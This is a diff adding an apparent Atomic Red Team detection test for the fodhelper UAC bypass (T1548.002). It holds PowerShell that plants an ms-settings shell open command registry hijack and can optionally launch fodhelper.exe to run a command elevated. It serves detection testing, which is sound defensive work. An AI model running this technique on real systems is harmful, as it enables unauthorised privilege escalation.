@@ -1,0 +1,32 @@
+attack_technique: T1548.002
+display_name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+atomic_tests:
+- name: DAC - ms-settings shell open command hijack (fodhelper)
+  auto_generated_guid: 4a2302dd-70bf-4f34-b486-284a59ac1424
+  description: |
+    Creates HKCU\Software\Classes\ms-settings\shell\open\command (the fodhelper.exe UAC
+    bypass). By default fodhelper is NOT launched, so only the registry write happens - that
+    is all the detection needs. Set launch_fodhelper=true to complete the bypass in the lab.
+    Triggers: registry_set_win_uac_bypass_shell_open_command.
+  supported_platforms:
+  - windows
+  input_arguments:
+    command_to_execute:
+      description: Command fodhelper would run elevated
+      type: string
+      default: C:\Windows\System32\cmd.exe /c echo DAC-T1548.002
+    launch_fodhelper:
+      description: Whether to launch fodhelper.exe after planting the key
+      type: string
+      default: "false"
+  executor:
+    command: |
+      $key = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+      New-Item $key -Force | Out-Null
+      New-ItemProperty -Path $key -Name "DelegateExecute" -Value "" -Force | Out-Null
+      Set-ItemProperty -Path $key -Name "(default)" -Value "#{command_to_execute}" -Force
+      if ("#{launch_fodhelper}" -eq "true") { Start-Process "C:\Windows\System32\fodhelper.exe" }
+    cleanup_command: |
+      Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: false
